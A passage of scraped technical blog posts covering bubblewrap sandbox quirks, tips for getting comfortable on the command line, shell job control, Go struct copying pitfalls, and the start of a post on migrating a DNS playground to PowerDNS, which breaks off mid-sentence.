weird thing 2b:   --dev /dev  makes listening on privileged ports not work \n\n One other strange thing is that if I take the exact same command above (which\nworked!) and add  --dev /dev  (to set up the  /dev/  directory), it causes it to not work again: \n\n $ bwrap --ro-bind / / --dev /dev --unshare-all --uid 0 --cap-add cap_net_bind_service nc -l 80\nnc: Permission denied\n \n\n I think this might be a bug in bubblewrap, but I haven’t mustered the courage\nto dive into the bubblewrap code and start investigating yet. Or maybe there’s\nsomething obvious I’m missing! \n\n weird thing 3: UID mappings \n\n Another slightly weird thing was – I tried to run  apt-get update  inside a bubblewrap Ubuntu container and everything went very poorly. \n\n Here’s how I ran  apt-get update  inside the Ubuntu container: \n\n mkdir rootfs\ndocker export $(docker create ubuntu:20.04) | tar -C rootfs -xf -\nbwrap \\\n    --bind $PWD/rootfs / \\\n    --proc /proc\\\n    --uid 0 \\\n    --unshare-pid \\\n    apt-get update\n \n\n And here are the error messages: \n\n E: setgroups 65534 failed - setgroups (1: Operation not permitted)\nE: setegid 65534 failed - setegid (22: Invalid argument)\nE: seteuid 100 failed - seteuid (22: Invalid argument)\nE: setgroups 0 failed - setgroups (1: Operation not permitted)\n.... lots more similar errors\n \n\n At first I thought “ok, this is a capabilities problem, I need to set\n CAP_SETGID  or something to give the container permission to change groups. But I did that and it didn’t help at all! \n\n I think what’s going on here is a problem with UID maps. What are UID maps?\nWell, every time you run a container using “user namespaces” (which podman is\ndoing), it creates a mapping of UIDs inside the container to UIDs on the host. \n\n Let’s look that the UID maps! Here’s how to do that: \n\n root@kiwi:/# cat /proc/self/uid_map \n         0       1000          1\nroot@kiwi:/# cat /proc/self/gid_map \n      1000       1000          1\n \n\n This is saying that user 0 in the container is mapped to user 1000 on in the\nhost, and group 1000 is mapped to group 1000. (My normal user’s UID/GID is 1000, so this makes sense). You can find out\nabout this  uid_map  file in  man user_namespaces . \n\n All other users/groups that aren’t 1000 are mapped to user 65534 by default, according\nto  man user_namespaces . \n\n what’s going on: non-mapped users can’t be used \n\n The only users and groups that have been mapped are  0  and  1000 . But  man user_namespaces  says: \n\n \n After the uid_map and gid_map files have been written, only the mapped values may be used in system calls that change user and group IDs. \n \n\n apt  is trying to use users 100 and 65534. Those aren’t on the list of mapped\nusers! So they can’t be used! \n\n This works fine in podman, because podman sets up its UID and GID mappings differently: \n\n $ podman run -it ubuntu:20.04 bash\nroot@793d03a4d773:/# cat /proc/self/uid_map\n         0       1000          1\n         1     100000      65536\nroot@793d03a4d773:/# cat /proc/self/gid_map\n         0       1000          1\n         1     100000      65536\n \n\n All the users get mapped, not just 1000. \n\n I don’t quite know how to fix this, but I think it’s probably possible in\nbubblewrap to set up the uid mappings the same way as podman does – there’s an\n issue about it here that links to a workaround . \n\n But this wasn’t an actual problem I was trying to solve so I didn’t dig further\ninto it. \n\n a quick note on Firecracker \n\n Someone asked “would Firecracker work here?” (I  wrote about Firecracker  last year). \n\n My experience with Firecracker VMs is that they use kind of a lot of RAM (like\n50MB?), which makes sense because they’re VMs. And when I tried Firecracker on\na tiny machine (with ~256MB of RAM / a tiny CPU), the startup times were 2-3\nseconds. \n\n I’m sure it’s possible to optimize Firecracker to be a bit faster, but at the\nend of the day I think it’s a VM and it’s not going to be anywhere near as low\noverhead as a process – there’s a whole operating system to start! \n\n So Firecracker would add a lot more overhead than I want in this case. \n\n bubblewrap works pretty great! \n\n I’ve talked about a bunch of issues, but the things I’ve been trying to do in bubblewrap\nhave been very constrained and it’s actually been pretty simple. For example, I\nwas working on a git project where I really just want to run  git  inside a\ncontainer and map a git repository from the host. \n\n That’s very simple to get to work with bubblewrap! There were basically no weird problems!\nIt’s really fast! \n\n So I’m pretty excited about this tool and I might use it for more stuff in the\nfuture. \n\n"},
{"url": "https://jvns.ca/blog/2023/08/08/what-helps-people-get-comfortable-on-the-command-line-/", "title": "What helps people get comfortable on the command line?", "content": "\n     \n\n Sometimes I talk to friends who need to use the command line, but are\nintimidated by it. I never really feel like I have good advice (I’ve been using\nthe command line for too long), and so I asked some people  on Mastodon : \n\n \n if you just stopped being scared of the command line in the last year or\nthree — what helped you? \n\n (no need to reply if you don’t remember, or if you’ve been using the command\nline comfortably for 15 years — this question isn’t for you :) ) \n \n\n This list is still a bit shorter than I would like, but I’m posting it in the\nhopes that I can collect some more answers. There obviously isn’t one single\nthing that works for everyone – different people take different paths. \n\n I think there are three parts to getting comfortable:  reducing risks ,  motivation  and  resources . I’ll\nstart with risks, then a couple of motivations and then list some resources. \n\n ways to reduce risk \n\n A lot of people are (very rightfully!) concerned about accidentally doing some\ndestructive action on the command line that they can’t undo. \n\n A few strategies people said helped them reduce risks: \n\n \n regular backups (one person mentioned they accidentally deleted their entire\nhome directory last week in a command line mishap, but it was okay because\nthey had a backup) \n For code, using git as much as possible \n Aliasing  rm  to a tool like  safe-rm  or  rmtrash  so that you can’t accidentally delete something you shouldn’t (or just  rm -i ) \n Mostly avoid using wildcards, use tab completion instead. (my shell will tab complete  rm *.txt  and show me exactly what it’s going to remove) \n Fancy terminal prompts that tell you the current directory, machine you’re on, git branch, and whether you’re root \n Making a copy of files if you’re planning to run an untested / dangerous command on them \n Having a dedicated test machine (like a cheap old Linux computer or Raspberry Pi) for particularly dangerous testing, like testing backup software or partitioning \n Use  --dry-run  options for dangerous commands, if they’re available \n Build your own  --dry-run  options into your shell scripts \n \n\n a “killer app” \n\n A few people mentioned a “killer command line app” that motivated them to start\nspending more time on the command line. For example: \n\n \n ripgrep \n jq \n wget / curl \n git (some folks found they preferred the git CLI to using a GUI) \n ffmpeg (for video work) \n yt-dlp \n hard drive data recovery tools (from  this great story ) \n \n\n A couple of people also mentioned getting frustrated with GUI tools (like heavy\nIDEs that use all your RAM and crash your computer) and being motivated to\nreplace them with much lighter weight command line tools. \n\n inspiring command line wizardry \n\n One person mentioned being motivated by seeing cool stuff other people were\ndoing with the command line, like: \n\n \n Command-line Tools can be 235x Faster than your Hadoop Cluster \n this “command-line chainsaw” talk by Gary Bernhardt \n \n\n explain shell \n\n Several people mentioned  explainshell  where you\ncan paste in any shell incantation and get it to break it down into different\nparts. \n\n history, tab completion, etc: \n\n There were lots of little tips and tricks mentioned that make it a lot easier\nto work on the command line, like: \n\n \n up arrow to see the previous command \n Ctrl+R to search your bash history \n navigating inside a line with  Ctrl+w  (to delete a word),  Ctrl+a  (to go to\nthe beginning of the line),  Ctrl+e  (to go to the end), and  Ctrl+left arrow  /  Ctrl+right arrow  (to\njump back/forward a word) \n setting bash history to unlimited \n cd -  to go back to the previous directory \n tab completion of filenames and command names \n learning how to use a pager like  less  to read man pages or other large text files (how to search, scroll, etc) \n backing up configuration files before editing them \n using pbcopy/pbpaste on Mac OS to copy/paste from your clipboard to stdout/stdin \n on Mac OS, you can drag a folder from the Finder into the terminal to get its path \n \n\n fzf \n\n Lots of mentions of using  fzf  as a better\nway to fuzzy search shell history. Some other things people mentioned using fzf for: \n\n \n picking git branches ( git checkout  $(git for-each-ref --format='%(refname:short)' refs/heads/ | fzf) ) \n quickly finding files to edit ( nvim $(fzf) ) \n switching kubernetes contexts ( kubectl config use-context $(kubectl config get-contexts -o name | fzf --height=10 --prompt=\"Kubernetes Context> \") ) \n picking a specific test to run from a test suite \n \n\n The general pattern here is that you use fzf to pick something (a file, a git\nbranch, a command line argument), fzf prints the thing you picked to stdout,\nand then you insert that as the command line argument to another command. \n\n You can also use fzf as an tool to automatically preview the output and quickly iterate, for example: \n\n \n automatically previewing jq output ( echo '' | fzf --preview \"jq {q} < YOURFILE.json\" ) \n or for  sed  ( echo '' | fzf --preview \"sed {q} YOURFILE\" ) \n or for  awk  ( echo '' | fzf --preview \"awk {q} YOURFILE\" ) \n \n\n You get the idea. \n\n In general folks will generally define an alias for their  fzf  incantations so\nyou can type  gcb  or something to quickly pick a git branch to check out. \n\n raspberry pi \n\n Some people started using a Raspberry Pi, where it’s safer to experiment\nwithout worrying about breaking your computer (you can just erase the SD card and start over!) \n\n a fancy shell setup \n\n Lots of people said they got more comfortable with the command line\nwhen they started using a more user-friendly shell setup like\n oh-my-zsh  or  fish . I really\nagree with this one – I’ve been using fish for 10 years and I love it. \n\n A couple of other things you can do here: \n\n \n some folks said that making their terminal prettier helped them feel more\ncomfortable (“make it pink!”). \n set up a fancy shell prompt to give you more information (for example you can\nmake the prompt red when a command fails). Specifically  transient prompts \n(where you set a super fancy prompt for the current command, but a much\nsimpler one for past commands) seem really nice. \n \n\n Some tools for theming your terminal: \n\n \n I use  base16-shell \n powerlevel10k  is a popular fancy zsh theme which has transient prompts \n starship  is a fancy prompt tool \n on a Mac, I think  iTerm2  is easier to customize than the default terminal \n \n\n a fancy file manager \n\n A few people mentioned fancy terminal file managers like\n ranger  or\n nnn , which I hadn’t heard of. \n\n a helpful friend or coworker \n\n Someone who can answer beginner questions and give you pointers is invaluable. \n\n shoulder surfing \n\n Several mentions of watching someone more experienced using the terminal –\nthere are lots of little things that experienced users don’t even realize\nthey’re doing which you can pick up. \n\n aliases \n\n Lots of people said that making their own aliases or scripts for commonly used\ntasks felt like a magical “a ha!” moment, because: \n\n \n they don’t have to remember the syntax \n then they have a list of their most commonly used commands that they can summon easily \n \n\n cheat sheets to get examples \n\n A lot of man pages don’t have examples, for example the  openssl s_client  man page has no examples.\nThis makes it a lot harder to get started! \n\n People mentioned a couple of cheat sheet tools, like: \n\n \n tldr.sh \n cheat  (which has the bonus of being editable – you can add your own commands to reference later) \n um  (an incredibly minimal system that you have to build yourself) \n \n\n For example the  cheat page for openssl  is really\ngreat – I think it includes almost everything I’ve ever actually used openssl\nfor in practice (except the  -servername  option for  openssl s_client ). \n\n One person said that they configured their  .bash_profile  to print out a cheat\nsheet every time they log in. \n\n don’t try to memorize \n\n A couple of people said that they needed to change their approach – instead of\ntrying to memorize all the commands, they realized they could just look up\ncommands as needed and they’d naturally memorize the ones they used the most\nover time. \n\n (I actually recently had the exact same realization about learning to read x86\nassembly – I was taking a class and the instructor said “yeah, just look\neverything up every time to start, eventually you’ll learn the most common\ninstructions by heart”) \n\n Some people also said the opposite – that they used a spaced repetition app\nlike Anki to memorize commonly used commands. \n\n vim \n\n One person mentioned that they started using vim on the command line to edit\nfiles, and once they were using a terminal text editor it felt more natural to\nuse the command line for other things too. \n\n Also apparently there’s a new editor called\n micro  which is like a nicer version of\npico/nano, for folks who don’t want to learn emacs or vim. \n\n use Linux on the desktop \n\n One person said that they started using Linux as their main daily driver, and\nhaving to fix Linux issues helped them learn. That’s also how I got comfortable\nwith the command too back in ~2004 (I was really into installing lots of\ndifferent Linux distributions to try to find my favourite one), but my guess is\nthat it’s not the most popular strategy these days. \n\n being forced to only use the terminal \n\n Some people said that they took a university class where the professor made\nthem do everything in the terminal, or that they created a rule for themselves\nthat they had to do all their work in the terminal for a while. \n\n workshops \n\n A couple of people said that workshops like  Software Carpentry \nworkshops (an introduction to the command line, git, and Python/R programming\nfor scientists) helped them get more comfortable with the command line. \n\n You can see the  software carpentry curriculum here . \n\n books & articles \n\n a few that were mentioned: \n\n articles: \n\n \n The Terminal \n command line kung fu  (has a mix of Unix and Windows command line tips) \n \n\n books: \n\n \n effective linux at the command line \n unix power tools (which might be outdated) \n The Linux Pocket guide \n \n\n videos: \n\n \n CLI tools aren’t inherently user-hostile   by Mindy Preston \n Gary Bernhardt’s  destroy all software screencasts \n DistroTube \n \n\n"},
{"url": "https://jvns.ca/blog/2024/07/03/reasons-to-use-job-control/", "title": "Reasons to use your shell's job control", "content": "\n     \n\n Hello! Today someone on Mastodon asked about job control ( fg ,  bg ,  Ctrl+z ,\n wait , etc). It made me think about how I don’t use my shell’s job\ncontrol interactively very often: usually I prefer to just open a new terminal\ntab if I want to run multiple terminal programs, or use tmux if it’s over ssh.\nBut I was curious about whether other people used job control more often than me. \n\n So I  asked on Mastodon  for\nreasons people use job control. There were a lot of great responses, and it\neven made me want to consider using job control a little more! \n\n In this post I’m only going to talk about using job control interactively (not\nin scripts) – the post is already long enough just talking about interactive\nuse. \n\n what’s job control? \n\n First: what’s job control? Well – in a terminal, your processes can be in one of 3 states: \n\n \n in the  foreground . This is the normal state when you start a process. \n in the  background . This is what happens when you run  some_process & : the process is still running, but you can’t interact with it anymore unless you bring it back to the foreground. \n stopped . This is what happens when you start a process and then press  Ctrl+Z . This pauses the process: it won’t keep using the CPU, but you can restart it if you want. \n \n\n “Job control” is a set of commands for seeing which processes are running in a terminal and moving processes between these 3 states \n\n how to use job control \n\n \n fg  brings a process to the foreground. It works on both stopped processes and background processes. For example, if you start a background process with  cat < /dev/zero & , you can bring it back to the foreground by running  fg \n bg  restarts a stopped process and puts it in the background. \n Pressing  Ctrl+z  stops the current foreground process. \n jobs  lists all processes that are active in your terminal \n kill  sends a signal (like  SIGKILL ) to a job (this is the shell builtin  kill , not  /bin/kill ) \n disown  removes the job from the list of running jobs, so that it doesn’t get killed when you close the terminal \n wait  waits for all background processes to complete. I only use this in scripts though. \n apparently in bash/zsh you can also just type  %2  instead of  fg %2 \n \n\n I might have forgotten some other job control commands but I think those are all the ones I’ve ever used. \n\n You can also give  fg  or  bg  a specific job to foreground/background. For example if I see this in the output of  jobs : \n\n $ jobs\nJob Group State   Command\n1   3161  running cat < /dev/zero &\n2   3264  stopped nvim -w ~/.vimkeys $argv\n \n\n then I can foreground  nvim  with  fg %2 . You can also kill it with  kill -9 %2 , or just  kill %2  if you want to be more gentle. \n\n how is  kill %2  implemented? \n\n I was curious about how  kill %2  works – does  %2  just get replaced with the\nPID of the relevant process when you run the command, the way environment\nvariables are? Some quick experimentation shows that it isn’t: \n\n $ echo kill %2\nkill %2\n$ type kill\nkill is a function with definition\n# Defined in /nix/store/vicfrai6lhnl8xw6azq5dzaizx56gw4m-fish-3.7.0/share/fish/config.fish\n \n\n So  kill  is a fish builtin that knows how to interpret  %2 . Looking at\nthe source code (which is very easy in fish!), it uses  jobs -p %2  to expand  %2 \ninto a PID, and then runs the regular  kill  command. \n\n on differences between shells \n\n Job control is implemented by your shell. I use fish, but my sense is that the\nbasics of job control work pretty similarly in bash, fish, and zsh. \n\n There are definitely some shells which don’t have job control at all, but I’ve\nonly used bash/fish/zsh so I don’t know much about that. \n\n Now let’s get into a few reasons people use job control! \n\n reason 1: kill a command that’s not responding to Ctrl+C \n\n I run into processes that don’t respond to  Ctrl+C  pretty regularly, and it’s\nalways a little annoying – I usually switch terminal tabs to find and kill and\nthe process. A bunch of people pointed out that you can do this in a faster way\nusing job control! \n\n How to do this: Press  Ctrl+Z , then  kill %1  (or the appropriate job number\nif there’s more than one stopped/background job, which you can get from\n jobs ). You can also  kill -9  if it’s really not responding. \n\n reason 2: background a GUI app so it’s not using up a terminal tab \n\n Sometimes I start a GUI program from the command line (for example with\n wireshark some_file.pcap ), forget to start it in the background, and don’t want it eating up my terminal tab. \n\n How to do this: \n\n \n move the GUI program to the background by pressing  Ctrl+Z  and then running  bg . \n you can also run  disown  to remove it from the list of jobs, to make sure that\nthe GUI program won’t get closed when you close your terminal tab. \n \n\n Personally I try to avoid starting GUI programs from the terminal if possible\nbecause I don’t like how their stdout pollutes my terminal (on a Mac I use\n open -a Wireshark  instead because I find it works better but sometimes you\ndon’t have another choice. \n\n reason 2.5: accidentally started a long-running job without  tmux \n\n This is basically the same as the GUI app thing – you can move the job to the\nbackground and disown it. \n\n I was also curious about if there are ways to redirect a process’s output to a\nfile after it’s already started. A quick search turned up  this Linux-only tool  which is based on\n nelhage ’s  reptyr  (which lets you for example move a\nprocess that you started outside of tmux to tmux) but I haven’t tried either of\nthose. \n\n reason 3: running a command while using  vim \n\n A lot of people mentioned that if they want to quickly test something while\nediting code in  vim  or another terminal editor, they like to use  Ctrl+Z \nto stop vim, run the command, and then run  fg  to go back to their editor. \n\n You can also use this to check the output of a command that you ran before\nstarting  vim . \n\n I’ve never gotten in the habit of this, probably because I mostly use a GUI\nversion of vim. I feel like I’d also be likely to switch terminal tabs and end\nup wondering “wait… where did I put my editor???” and have to go searching\nfor it. \n\n reason 4: preferring interleaved output \n\n A few people said that they prefer to the output of all of their commands being\ninterleaved in the terminal. This really surprised me because I usually think\nof having the output of lots of different commands interleaved as being a  bad \nthing, but one person said that they like to do this with tcpdump specifically\nand I think that actually sounds extremely useful. Here’s what it looks like: \n\n # start tcpdump\n$ sudo tcpdump -ni any port 1234 &\ntcpdump: data link type PKTAP\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on any, link-type PKTAP (Apple DLT_PKTAP), snapshot length 524288 bytes\n\n# run curl\n$ curl google.com:1234\n13:13:29.881018 IP 192.168.1.173.49626 > 142.251.41.78.1234: Flags [S], seq 613574185, win 65535, options [mss 1460,nop,wscale 6,nop,nop,TS val 2730440518 ecr 0,sackOK,eol], length 0\n13:13:30.881963 IP 192.168.1.173.49626 > 142.251.41.78.1234: Flags [S], seq 613574185, win 65535, options [mss 1460,nop,wscale 6,nop,nop,TS val 2730441519 ecr 0,sackOK,eol], length 0\n13:13:31.882587 IP 192.168.1.173.49626 > 142.251.41.78.1234: Flags [S], seq 613574185, win 65535, options [mss 1460,nop,wscale 6,nop,nop,TS val 2730442520 ecr 0,sackOK,eol], length 0\n \n# when you're done, kill the tcpdump in the background\n$ kill %1 \n \n\n I think it’s really nice here that you can see the output of tcpdump inline in\nyour terminal – when I’m using tcpdump I’m always switching back and forth and\nI always get confused trying to match up the timestamps, so keeping everything\nin one terminal seems like it might be a lot clearer. I’m going to try it. \n\n reason 5: suspend a CPU-hungry program \n\n One person said that sometimes they’re running a very CPU-intensive program,\nfor example converting a video with  ffmpeg , and they need to use the CPU for\nsomething else, but don’t want to lose the work that ffmpeg already did. \n\n You can do this by pressing  Ctrl+Z  to pause the process, and then run  fg \nwhen you want to start it again. \n\n reason 6: you accidentally ran Ctrl+Z \n\n Many people replied that they didn’t use job control  intentionally , but\nthat they sometimes accidentally ran Ctrl+Z, which stopped whatever program was\nrunning, so they needed to learn how to use  fg  to bring it back to the\nforeground. \n\n The were also some mentions of accidentally running  Ctrl+S  too (which stops\nyour terminal and I think can be undone with  Ctrl+Q ). My terminal totally\nignores  Ctrl+S  so I guess I’m safe from that one though. \n\n reason 7: already set up a bunch of environment variables \n\n Some folks mentioned that they already set up a bunch of environment variables\nthat they need to run various commands, so it’s easier to use job control to\nrun multiple commands in the same terminal than to redo that work in another\ntab. \n\n reason 8: it’s your only option \n\n Probably the most obvious reason to use job control to manage multiple\nprocesses is “because you have to” – maybe you’re in single-user mode, or on a\nvery restricted computer, or SSH’d into a machine that doesn’t have tmux or\nscreen and you don’t want to create multiple SSH sessions. \n\n reason 9: some people just like it better \n\n Some people also said that they just don’t like using terminal tabs: for\ninstance a few folks mentioned that they prefer to be able to see all of their\nterminals on the screen at the same time, so they’d rather have 4 terminals on\nthe screen and then use job control if they need to run more than 4 programs. \n\n I learned a few new tricks! \n\n I think my two main takeaways from thos post is I’ll probably try out job control a little more for: \n\n \n killing processes that don’t respond to Ctrl+C \n running  tcpdump  in the background with whatever network command I’m running, so I can see both of their output in the same place \n \n\n"},
{"url": "https://jvns.ca/blog/2024/08/06/go-structs-copied-on-assignment/", "title": "Go structs are copied on assignment (and other things about Go I'd missed)", "content": "\n     \n\n I’ve been writing Go pretty casually for years – the backends for all of my\nplaygrounds ( nginx ,  dns ,  memory ,  more DNS ) are written in Go, but many of those projects are just a few hundred lines and I don’t come back to those codebases much. \n\n I thought I more or less understood the basics of the language, but this week\nI’ve been writing a lot more Go than usual while working on some upgrades to\n Mess with DNS , and ran into a bug that revealed I\nwas missing a very basic concept! \n\n Then I posted about this on Mastodon and someone linked me to this very cool\nsite (and book) called  100 Go Mistakes and How To Avoid Them  by  Teiva Harsanyi . It just came out in 2022 so it’s relatively new. \n\n I decided to read through the site to see what  else  I was missing, and found\na couple of other misconceptions I had about Go. I’ll talk about some of the\nmistakes that jumped out to me the most, but really the whole\n 100 Go Mistakes  site is great and I’d recommend reading it. \n\n Here’s the initial mistake that started me on this journey: \n\n mistake 1: not understanding that structs are copied on assignment \n\n Let’s say we have a struct: \n\n type Thing struct {\n    Name string\n}\n \n\n and this code: \n\n thing := Thing{\"record\"}\nother_thing := thing\nother_thing.Name = \"banana\"\nfmt.Println(thing)\n \n\n This prints “record” and not “banana” ( play.go.dev link ), because  thing  is copied when you\nassign it to  other_thing . \n\n the problem this caused me: ranges \n\n The bug I spent 2 hours of my life debugging last week was effectively this code ( play.go.dev link ): \n\n type Thing struct {\n  Name string\n}\nfunc findThing(things []Thing, name string) *Thing {\n  for _, thing := range things {\n    if thing.Name == name {\n      return &thing\n    }\n  }\n  return nil\n}\n\nfunc main() {\n  things := []Thing{Thing{\"record\"}, Thing{\"banana\"}}\n  thing := findThing(things, \"record\")\n  thing.Name = \"gramaphone\"\n  fmt.Println(things)\n}\n \n\n This prints out  [{record} {banana}]  – because  findThing  returned a copy, we didn’t change the name in the original array. \n\n This mistake is  #30 in 100 Go Mistakes . \n\n I fixed the bug by changing it to something like this ( play.go.dev link ), which returns a\nreference to the item in the array we’re looking for instead of a copy. \n\n func findThing(things []Thing, name string) *Thing {\n  for i := range things {\n    if things[i].Name == name {\n      return &things[i]\n    }\n  }\n  return nil\n}\n \n\n why didn’t I realize this? \n\n When I learned that I was mistaken about how assignment worked in Go I was\nreally taken aback, like – it’s such a basic fact about the language works!\nIf I was wrong about that then what ELSE am I wrong about in Go???? \n\n My best guess for what happened is: \n\n \n I’ve heard for my whole life that when you define a function,\nyou need to think about whether its arguments are passed by  reference  or\nby  value \n So I’d thought about this in Go, and I knew that if you pass a struct as a\nvalue to a function, it gets copied – if you want to pass a reference then\nyou have to pass a pointer \n But somehow it never occurred to me that you need to think about the same\nthing for  assignments , perhaps because in most of the other languages I\nuse (Python, JS, Java) I think everything is a reference anyway. Except for\nin Rust, where you do have values that you make copies of but I think most of the time I had to run  .clone()  explicitly.\n(though apparently structs will be automatically copied on assignment if the struct implements the  Copy  trait) \n Also obviously I just don’t write that much Go so I guess it’s never come\nup. \n \n\n mistake 2: side effects appending slices ( #25 ) \n\n When you subset a slice with  x[2:3] , the original slice and the sub-slice\nshare the same backing array, so if you append to the new slice, it can\nunintentionally change the old slice: \n\n For example, this code prints  [1 2 3 555 5]  ( code on play.go.dev ) \n\n x := []int{1, 2, 3, 4, 5}\ny := x[2:3]\ny = append(y, 555)\nfmt.Println(x)\n \n\n I don’t think this has ever actually happened to me, but it’s alarming and I’m\nvery happy to know about it. \n\n Apparently you can avoid this problem by changing  y := x[2:3]  to  y :=\nx[2:3:3] , which restricts the new slice’s capacity so that appending to it\nwill re-allocate a new slice. Here’s some  code on play.go.dev  that does that. \n\n mistake 3: not understanding the different types of method receivers (#42) \n\n This one isn’t a “mistake” exactly, but it’s been a source of confusion for me\nand it’s pretty simple so I’m glad to have it cleared up. \n\n In Go you can declare methods in 2 different ways: \n\n \n func (t Thing) Function()  (a “value receiver”) \n func (t *Thing) Function()  (a “pointer receiver”) \n \n\n My understanding now is that basically: \n\n \n If you want the method to mutate the struct  t , you need a pointer receiver. \n If you want to make sure the method  doesn’t  mutate the struct  t , use a value receiver. \n \n\n Explanation #42  has a\nbunch of other interesting details though. There’s definitely still something\nI’m missing about value vs pointer receivers (I got a compile error related to\nthem a couple of times in the last week that I still don’t understand), but\nhopefully I’ll run into that error again soon and I can figure it out. \n\n more interesting things I noticed \n\n Some more notes from 100 Go Mistakes: \n\n \n apparently you can  name the outputs of your function (#43) , though that can have  issues (#44)  and I’m not sure I want to \n apparently you can put tests in a different package (#90)  to\nensure that you only use the package’s public interfaces, which seems really\nuseful \n there are a lots of notes about how to use contexts, channels, goroutines,\nmutexes, sync.WaitGroup, etc. I’m sure I have something to learn about all of\nthose but today is not the day I’m going to learn them. \n \n\n Also there are some things that have tripped me up in the past, like: \n\n \n forgetting the return statement after replying to an HTTP request (#80) \n not realizing the httptest package exists (#88) \n \n\n this “100 common mistakes” format is great \n\n I really appreciated this “100 common mistakes” format – it made it really\neasy for me to skim through the mistakes and very quickly mentally classify\nthem into: \n\n \n yep, I know that \n not interested in that one right now \n WOW WAIT I DID NOT KNOW THAT, THAT IS VERY USEFUL!!!! \n \n\n It looks like “100 Common Mistakes” is a series of books from Manning and they\nalso have “100 Java Mistakes” and an upcoming “100 SQL Server Mistakes”. \n\n Also I enjoyed what I’ve read of  Effective Python  by Brett Slatkin, which has a similar “here are a bunch of\nshort Python style tips” structure where you can quickly skim it and take\nwhat’s useful to you. There’s also Effective C++, Effective Java, and probably\nmore. \n\n some other Go resources \n\n other resources I’ve appreciated: \n\n \n Go by example  for basic syntax \n go.dev/play \n obviously  https://pkg.go.dev  for documentation about literally everything \n staticcheck  seems like a useful linter – for\nexample I just started using it to tell me when I’ve forgotten to handle an\nerror \n apparently  golangci-lint  includes a bunch of different linters \n \n\n"},
{"url": "https://jvns.ca/blog/2024/08/19/migrating-mess-with-dns-to-use-powerdns/", "title": "Migrating Mess With DNS to use PowerDNS", "content": "\n     \n\n About 3 years ago, I announced  Mess With DNS  in\n this blog post , a playground\nwhere you can learn how DNS works by messing around and creating records. \n\n I wasn’t very careful with the DNS implementation though (to quote the release blog\npost: “following the DNS RFCs? not exactly”), and people started reporting\nproblems that eventually I decided that I wanted to fix. \n\n the problems \n\n Some of the problems people have reported were: \n\n \n domain names with underscores weren’t allowed, even though they should be \n If there was a CNAME record for a domain name, it allowed you to create other records for that domain name, even if it shouldn’t \n you could create 2 different CNAME records for the same domain name, which shouldn’t be allowed \n no support for the SVCB or HTTPS record types, which seemed a little complex to implement \n no support for upgrading from UDP to TCP for big responses \n \n\n And there are certainly more issues that nobody got around to reporting, for\nexample that if you added an NS record for a subdomain to delegate it, Mess\nWith DNS wouldn’t handle the delegation properly. \n\n the solution: PowerDNS \n\n I wasn’t sure how to fix these problems for a long time – technically I\n could  have started addressing them individually, but it felt like there were\na million edge cases and I’d never get there. \n\n But then one day I was chatting with someone else who was working on a DNS\nserver and they said they were using  PowerDNS : an open\nsource DNS server with an HTTP API! \n\n This seemed like an obvious solution to my problems – I could just swap out my\nown crappy DNS implementation for PowerDNS. \n\n There were a couple of challenges I ran into when setting up PowerDNS that I’ll\ntalk about here. I really don’t do a lot of web development and I think I’ve never\nbuilt a website that depends on a relatively complex API before, so it was a\nbit of a learning experience. \n\n challenge 1: getting every query made to the DNS server \n\n One of the main things Mess With DNS does is give you a live view of every DNS\nquery it receives for your subdomain, using a websocket. To make this work, it\nneeds to intercept every DNS query before they it gets sent to the PowerDNS DNS\nserver: \n\n There were 2 options I could think of for how to intercept the DNS queries: \n\n \n dnstap:  dnsdist  (a DNS load balancer from the PowerDNS project) has\nsupport for logging all DNS queries it receives using\n dnstap , so I could put dnsdist in front of PowerDNS\nand then log queries that way \n Have my Go server listen on port 53 and proxy the queries myself \n \n\n I originally implemented option #1, but for some reason there was a 1 second\ndelay before every query got logged. I couldn’t figure out why, so I\nimplemented my own  very simple proxy  instead. \n\n challenge 2: should the frontend have direct access to the PowerDNS API? \n\n The frontend used to have a lot of DNS logic in it – it converted emoji domain\nnames to ASCII using punycode, had a lookup table to convert numeric DNS query\ntypes (like  1 ) to their human-readable names (like  A ), did a little bit of\nvalidation, and more. \n\n Originally I considered keeping this pattern and just giving the frontend (more\nor less) direct access to the PowerDNS API to create and delete, but writing\neven more complex code in Javascript didn’t feel that appealing to me – I\ndon’t really know how to write tests in Javascript and it seemed like it\nwouldn’t end well. \n\n So I decided to take all of the DNS logic out of the frontend and write a new\nDNS API for managing records, shaped something like this: \n\n \n GET /records \n DELETE /records/<ID> \n DELETE /records/  (delete all records for a user) \n POST /records/  (create record) \n POST /records/<ID>  (update record) \n \n\n This meant that I could actually write tests for my code, since the backend is\nin Go and I do know how to write tests in Go. \n\n what I learned: it’s okay for an API to duplicate information \n\n I had this idea that APIs shouldn’t return duplicate information – for example\nif I get a DNS record, it should only include a given piece of information\nonce. \n\n But I ran into a problem with that idea when displaying MX records: an MX\nrecord has 2 fields, “preference”, and “mail server”. And I needed to display\nthat information in 2 different ways on the frontend: \n\n \n In a form, where “Preference” and “Mail Server” are 2 different form fields (like  10  and  mail.example.com ) \n In a summary view, where I wanted to just show the record ( 10 mail.example.com ) \n \n\n This is kind of a small problem, but it came up in a few different places. \n\n I talked to my friend Marco Rogers about this, and based on some advice from\nhim I realized that I could return the same information in the API in 2\ndifferent ways! Then the frontend just has to display it. So I started just\nreturning duplicate information in the API, something like this: \n\n {\n  values: {'Preference': 10, 'Server': 'mail.example.com'},\n  content: '10 mail.example.com',\n  ...\n}\n \n\n I ended up using this pattern in a couple of other places where I needed to\ndisplay the same information in 2 different ways and it was SO much easier. \n\n I think what I learned from this is that if I’m making an API that isn’t\nintended for external use (there are no users of this API other than the\nfrontend!), I can tailor it very specifically to the frontend’s needs and\nthat’s okay. \n\n challenge 3: what’s a record’s ID? \n\n In Mess With DNS (and I think in most DNS user interfaces!), you create, add, and delete  records . \n\n But that’s not how the PowerDNS API works. In PowerDNS, you create a  zone ,\nwhich is made of  record sets . Records don’t have any ID in the API at all. \n\n I ended up solving this by generate a fake ID for each records which is made of: \n\n \n its  name \n its  type \n and its  content  (base64-encoded) \n \n\n For example one record’s ID is  brooch225.messwithdns.com.|NS|bnMxLm1lc3N3aXRoZG5zLmNvbS4= \n\n Then I can search through the zone and find the appropriate record to update\nit. \n\n This means that if you update a record then its ID will change which isn’t\nusually what I want in an ID, but that seems fine. \n\n challenge 4: making clear error messages \n\n I think the error messages that the PowerDNS API returns aren’t really intended to be shown to end users, for example: \n\n \n Name 'new\\032site.island358.messwithdns.com.' contains unsupported characters  (this error encodes the space as  \\032 , which is a bit disorienting if you don’t know that the space character is 32 in ASCII) \n RRset test.pear5.messwithdns.com. IN CNAME: Conflicts with pre-existing RRset  (this talks about RRsets, which aren’t a 